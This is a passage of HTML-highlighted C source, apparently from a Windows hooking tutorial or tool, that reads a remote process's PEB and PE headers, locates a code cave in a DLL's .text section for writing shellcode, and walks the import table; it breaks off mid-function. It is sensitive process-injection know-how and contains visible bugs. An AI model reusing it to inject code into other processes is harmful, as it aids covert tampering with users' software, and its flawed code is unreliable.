    <span class="p">(</span>
        <span class="n">hNTDll</span><span class="p">,</span>
        <span class="s">&quot;NtQueryInformationProcess&quot;</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fpNtQueryInformationProcess</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;GetProcAddress() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">NtQueryInformationProcess</span> <span class="n">ntQueryInformationProcess</span> <span class="o">=</span> 
        <span class="p">(</span><span class="n">NtQueryInformationProcess</span><span class="p">)</span><span class="n">fpNtQueryInformationProcess</span><span class="p">;</span>

    <span class="n">status</span> <span class="o">=</span> <span class="n">ntQueryInformationProcess</span>
    <span class="p">(</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span> <span class="c1">// ProcessBasicInformation</span>
        <span class="o">&amp;</span><span class="n">procBasicInformation</span><span class="p">,</span>
        <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESS_BASIC_INFORMATION</span><span class="p">),</span>
        <span class="o">&amp;</span><span class="n">returnLength</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;NtQueryInformationProcess() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">procBasicInformation</span><span class="p">.</span><span class="n">PebBaseAddress</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// =============================================================================================</span>

<span class="cm">/* Get&#39;s the PEB of the own process */</span>
<span class="n">DWORD</span> 
<span class="nf">FindOwnPEB</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">pebAddr</span><span class="p">;</span>

<span class="cp">#ifdef _WIN32</span>
    <span class="n">_asm</span> 
    <span class="p">{</span>
        <span class="n">push</span> <span class="n">eax</span> <span class="c1">// push the values of the register eax on the stack</span>
        <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="nl">FS</span><span class="p">:[</span><span class="mh">0x30</span><span class="p">]</span> <span class="c1">// store the values ad address FS:[0x30] in eax</span>
        <span class="n">mov</span> <span class="p">[</span><span class="n">pebAddr</span><span class="p">],</span> <span class="n">eax</span> <span class="c1">// store the values of eax in the variable pebAddr</span>
        <span class="n">pop</span> <span class="n">eax</span> <span class="c1">// remake initial eax value</span>
    <span class="p">}</span>
<span class="cp">#endif</span>

<span class="cp">#ifdef _WIN64</span>
    <span class="n">_asm</span>
    <span class="p">{</span>
        <span class="n">push</span> <span class="n">rax</span>
        <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="nl">FS</span><span class="p">:[</span><span class="mh">0x30</span><span class="p">]</span>
        <span class="n">mov</span> <span class="p">[</span><span class="n">pebAddr</span><span class="p">],</span> <span class="n">rax</span>
        <span class="n">pop</span> <span class="n">rax</span>
    <span class="p">}</span>
<span class="cp">#endif</span>

    <span class="k">return</span> <span class="n">pebAddr</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// =============================================================================================</span>

<span class="n">PIMAGE_DATA_DIRECTORY</span>
<span class="nf">ReadRemoteDataDirectoryRVA</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">LPCVOID</span> <span class="n">lpImageBaseAddress</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">index</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PIMAGE_NT_HEADERS32</span> <span class="n">pNTHeaders</span><span class="p">;</span>
    <span class="n">PIMAGE_DATA_DIRECTORY</span> <span class="n">dataDir</span><span class="p">;</span>
    <span class="n">BYTE</span><span class="o">*</span> <span class="n">lpBuffer</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">oldProtect</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">index</span> <span class="o">&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;No valid DATA_DIRECTORY directory</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">lpBuffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">BUFFER_SIZE</span><span class="p">));</span>
    <span class="n">ZeroMemory</span><span class="p">(</span><span class="n">lpBuffer</span><span class="p">,</span> <span class="n">BUFFER_SIZE</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">lpBuffer</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;malloc() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">BOOL</span> <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">VirtualProtectEx</span>
    <span class="p">(</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">lpImageBaseAddress</span><span class="p">,</span>
        <span class="n">BUFFER_SIZE</span><span class="p">,</span>
        <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span>
        <span class="o">&amp;</span><span class="n">oldProtect</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;VirtualProtectEx() failed in ReadRemoteDataDirectoryRVA() with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">ReadProcessMemory</span>
    <span class="p">(</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="n">lpImageBaseAddress</span><span class="p">,</span>
        <span class="n">lpBuffer</span><span class="p">,</span>
        <span class="n">BUFFER_SIZE</span><span class="p">,</span>
        <span class="mi">0</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;ReadProcessMemory() failed in ReadRemoteDataDirectoryRVA() with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">PIMAGE_DOS_HEADER</span> <span class="n">pDOSHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">lpBuffer</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pDOSHeader</span><span class="o">-&gt;</span><span class="n">e_magic</span> <span class="o">!=</span> <span class="mh">0x5a4d</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Invalid DOS header. e_magic is not  0x5a4d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">pNTHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS32</span><span class="p">)(</span><span class="n">lpBuffer</span> <span class="o">+</span> <span class="n">pDOSHeader</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pNTHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">Magic</span> <span class="o">!=</span> <span class="mh">0x10b</span> <span class="o">&amp;&amp;</span> <span class="c1">// PE32</span>
        <span class="n">pNTHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">Magic</span> <span class="o">!=</span> <span class="mh">0x20b</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// PE32+</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Invalid Magic in OptionalHeader</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> 
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] Detected %s architecture</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
             <span class="n">pNTHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">Magic</span> <span class="o">==</span> <span class="mh">0x10b</span> <span class="o">?</span> <span class="s">&quot;PE32&quot;</span> <span class="o">:</span> <span class="s">&quot;PE32+&quot;</span><span class="p">);</span>

    <span class="n">dataDir</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pNTHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">index</span><span class="p">];</span>

    <span class="k">return</span> <span class="n">dataDir</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// =============================================================================================</span>

<span class="cm">/*</span>
<span class="cm"> * Caller has to free the returned LOADED_IMAGE structure.</span>
<span class="cm"> */</span>
<span class="n">PLOADED_IMAGE</span> <span class="nf">ReadRemoteImage</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpImageBaseAddress</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PCHAR</span> <span class="n">lpBuffer</span><span class="p">;</span>
    <span class="n">PIMAGE_DOS_HEADER</span> <span class="n">pDOSHeader</span><span class="p">;</span>
    <span class="n">PLOADED_IMAGE</span> <span class="n">pImage</span><span class="p">;</span>

    <span class="n">BOOL</span> <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">RetReadProcessMemory</span>
    <span class="p">(</span>
        <span class="o">&amp;</span><span class="n">lpBuffer</span><span class="p">,</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="n">lpImageBaseAddress</span><span class="p">,</span>
        <span class="n">BUFFER_SIZE</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;RetReadProcessMemory() failed in ReadRemoteImage() with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">pDOSHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">lpBuffer</span><span class="p">;</span>

    <span class="n">pImage</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">LOADED_IMAGE</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pImage</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;malloc() failed in ReadRemoteImage() with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">pImage</span><span class="o">-&gt;</span><span class="n">FileHeader</span> <span class="o">=</span> 
        <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS32</span><span class="p">)(</span><span class="n">lpBuffer</span> <span class="o">+</span> <span class="n">pDOSHeader</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>

    <span class="n">pImage</span><span class="o">-&gt;</span><span class="n">NumberOfSections</span> <span class="o">=</span> 
        <span class="n">pImage</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span>

    <span class="n">pImage</span><span class="o">-&gt;</span><span class="n">Sections</span> <span class="o">=</span> 
        <span class="p">(</span><span class="n">PIMAGE_SECTION_HEADER</span><span class="p">)(</span><span class="n">lpBuffer</span> <span class="o">+</span> <span class="n">pDOSHeader</span><span class="o">-&gt;</span><span class="n">e_lfanew</span> <span class="o">+</span> 
        <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_NT_HEADERS32</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pDOSHeader</span><span class="o">-&gt;</span><span class="n">e_magic</span> <span class="o">!=</span> <span class="mh">0x5a4d</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Invalid DOS header. e_magic is not  0x5a4d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pImage</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">Magic</span> <span class="o">!=</span> <span class="mh">0x10b</span> <span class="o">&amp;&amp;</span> <span class="c1">// PE32</span>
        <span class="n">pImage</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">Magic</span> <span class="o">!=</span> <span class="mh">0x20b</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// PE32+</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Invalid Magic in OptionalHeader</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> 
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[i] Detected %s architecture</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
             <span class="n">pImage</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">Magic</span> <span class="o">==</span> <span class="mh">0x10b</span> <span class="o">?</span> <span class="s">&quot;PE32&quot;</span> <span class="o">:</span> <span class="s">&quot;PE32+&quot;</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">pImage</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">// =============================================================================================</span>

<span class="n">PIMAGE_SECTION_HEADER</span> <span class="nf">FindSectionHeaderByName</span><span class="p">(</span><span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">pHeaders</span><span class="p">,</span> 
                                              <span class="n">DWORD</span> <span class="n">dwNumberOfSections</span><span class="p">,</span> <span class="n">LPCTSTR</span> <span class="n">pSectionName</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">pHeaderMatch</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dwNumberOfSections</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">pHeader</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pHeaders</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">_stricmp</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">pHeader</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">pSectionName</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">pHeaderMatch</span> <span class="o">=</span> <span class="n">pHeader</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">pHeaderMatch</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/*</span>
<span class="cm"> * Finds a code cave in the .text section of the DLL. If this function is unable to </span>
<span class="cm"> * find a code cave at least minimalSize bytes long, it fails and so will the whole </span>
<span class="cm"> * hooking attempt. By failure, will return 0.</span>
<span class="cm"> */</span>
<span class="n">DWORD</span>
<span class="nf">FindRemoteCodeCave</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpImageBaseAddress</span><span class="p">,</span> <span class="n">LPCTSTR</span> <span class="n">libName</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">minimalCodeCaveSize</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">dwHandlerAddress</span><span class="p">;</span>
    <span class="n">PLOADED_IMAGE</span> <span class="n">pLoadedImage</span><span class="p">;</span>
    <span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">pCodeSectionHeader</span><span class="p">;</span>

    <span class="n">pLoadedImage</span> <span class="o">=</span>  <span class="n">ReadRemoteImage</span>
    <span class="p">(</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="n">lpImageBaseAddress</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pLoadedImage</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;ReadRemoteImage failed...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">pCodeSectionHeader</span> <span class="o">=</span> <span class="n">FindSectionHeaderByName</span>
    <span class="p">(</span>
        <span class="n">pLoadedImage</span><span class="o">-&gt;</span><span class="n">Sections</span><span class="p">,</span>
        <span class="n">pLoadedImage</span><span class="o">-&gt;</span><span class="n">NumberOfSections</span><span class="p">,</span>
        <span class="s">&quot;.text&quot;</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pCodeSectionHeader</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Couldn&#39;t locate the .text section. Maybe it&#39;s named differently</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/*</span>
<span class="cm">     * Because there is a essential difference between PE Files in memory and on disk, </span>
<span class="cm">     * we might observe a phenomenon due to the different file alignment which comes handy</span>
<span class="cm">     * when we are in need to write our shell code to a process:</span>
<span class="cm">     */</span>
    <span class="n">dwHandlerAddress</span> <span class="o">=</span>  <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">lpImageBaseAddress</span> <span class="o">+</span> 
                        <span class="n">pCodeSectionHeader</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span> <span class="o">+</span> 
                        <span class="n">pCodeSectionHeader</span><span class="o">-&gt;</span><span class="n">SizeOfRawData</span> <span class="o">-</span> <span class="n">minimalCodeCaveSize</span><span class="p">;</span>

    <span class="k">return</span> <span class="n">dwHandlerAddress</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// =============================================================================================</span>

<span class="n">BOOL</span>
<span class="nf">PrintImportDirectory</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">PIMAGE_DATA_DIRECTORY</span> <span class="n">imageImportDirectory</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">imageBase</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PCHAR</span> <span class="n">buf</span><span class="p">,</span> <span class="n">dllNameBuf</span><span class="p">;</span>
    <span class="n">PCHAR</span> <span class="n">lpFunctionNameBuf</span><span class="p">;</span>
    <span class="n">PIMAGE_IMPORT_DESCRIPTOR</span> <span class="n">pImageImportDescriptor</span><span class="p">;</span>
    <span class="n">IMAGE_THUNK_DATA</span> <span class="n">ThunkDataINT</span><span class="p">,</span> <span class="n">ThunkDataIAT</span><span class="p">;</span>
    <span class="n">PIMAGE_IMPORT_BY_NAME</span> <span class="n">pImageImportByName</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">functionOffset</span><span class="p">,</span> <span class="n">firstRVA</span><span class="p">,</span> <span class="n">counter</span><span class="p">;</span>

    <span class="n">firstRVA</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="n">BOOL</span> <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">RetReadProcessMemory</span>
    <span class="p">(</span>
        <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span>
        <span class="n">hProcess</span><span class="p">,</span>
        <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">imageImportDirectory</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">),</span>
        <span class="mi">50</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_IMPORT_DESCRIPTOR</span><span class="p">)</span> <span class="c1">// not more than 50 dll&#39;s in a module :)</span>
    <span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;RetReadProcessMemory(buf) in PrintImportDirectory() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">bSuccess</span> <span class="o">!=</span> <span class="n">MEM_ALLOC_FAIL_CODE</span><span class="p">)</span>
            <span class="n">free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">pImageImportDescriptor</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_IMPORT_DESCRIPTOR</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
    <span class="cm">/* pImageImportDescriptor[index].Characteristics is </span>
<span class="cm">     * set to 0 to indicate the end of the array of IMAGE_IMPORT_DESCRIPTORs.</span>
<span class="cm">     */</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">pImageImportDescriptor</span><span class="o">-&gt;</span><span class="n">Characteristics</span><span class="p">)</span> <span class="p">{</span>

        <span class="cm">/* Read the memory of the DLLName:) */</span>
        <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">RetReadProcessMemory</span>
        <span class="p">(</span>
            <span class="o">&amp;</span><span class="n">dllNameBuf</span><span class="p">,</span>
            <span class="n">hProcess</span><span class="p">,</span>
            <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">pImageImportDescriptor</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">),</span>
            <span class="n">BUFFER_SIZE_SMALL</span>
        <span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;RetReadProcessMemory(dllNameBuf) in PrintImportDirectory() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">bSuccess</span> <span class="o">!=</span> <span class="n">MEM_ALLOC_FAIL_CODE</span><span class="p">)</span>
                <span class="n">free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dllNameBuf</span><span class="p">);</span>
            <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Dll </span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s"> found&quot;</span><span class="p">,</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">dllNameBuf</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n\t</span><span class="s">OriginalFirstThunk is 0x%x&quot;</span><span class="p">,</span> <span class="n">pImageImportDescriptor</span><span class="o">-&gt;</span><span class="n">OriginalFirstThunk</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n\t</span><span class="s">FirstThunk is 0x%x&quot;</span><span class="p">,</span> <span class="n">pImageImportDescriptor</span><span class="o">-&gt;</span><span class="n">FirstThunk</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n\t</span><span class="s">TimeDateStamp is 0x%x&quot;</span><span class="p">,</span> <span class="n">pImageImportDescriptor</span><span class="o">-&gt;</span><span class="n">TimeDateStamp</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n\t</span><span class="s">ForwarderChain is 0x%x&quot;</span><span class="p">,</span> <span class="n">pImageImportDescriptor</span><span class="o">-&gt;</span><span class="n">ForwarderChain</span><span class="p">);</span>

        <span class="n">free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dllNameBuf</span><span class="p">);</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n\n\t</span><span class="s">FUNCTION-NAME : FUNCTION-ADDRESS : ADDRESS OF FUNCTION ADDRESS&quot;</span><span class="p">);</span>
        <span class="n">functionOffset</span> <span class="o">=</span> <span class="p">(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">pImageImportDescriptor</span><span class="o">-&gt;</span><span class="n">FirstThunk</span><span class="p">);</span>
        <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* Read the memory of the INT thunk table element :) */</span>
            <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">ReadProcessMemory</span>
            <span class="p">(</span>
                <span class="n">hProcess</span><span class="p">,</span>
                <span class="p">(</span><span class="n">PVOID</span><span class="p">)(</span><span class="n">imageBase</span> <span class="o">+</span> <span class="n">pImageImportDescriptor</span><span class="o">-&gt;</span><span class="n">OriginalFirstThunk</span> <span class="o">+</span> <span class="n">counter</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">)),</span>
                <span class="o">&amp;</span><span class="n">ThunkDataINT</span><span class="p">,</span>
                <span class="k">sizeof</span><span class="p">(</span><span class="n">IMAGE_THUNK_DATA</span><span class="p">),</span>
                <span class="nb">NULL</span>
            <span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">bSuccess</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;RetReadProcessMemory(lpThunkINTBuffer) in PrintImportDirectory() failed with %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="cm">/* Read the memory of the IAT thunk table element :) */</span>
            <span class="n">bSuccess</span> <span class="o">=</span> <span class="n">ReadProcessMemory</span>
            <span class="p">(</span>
                <span class="n">hProcess</span><span class="p">,</span>
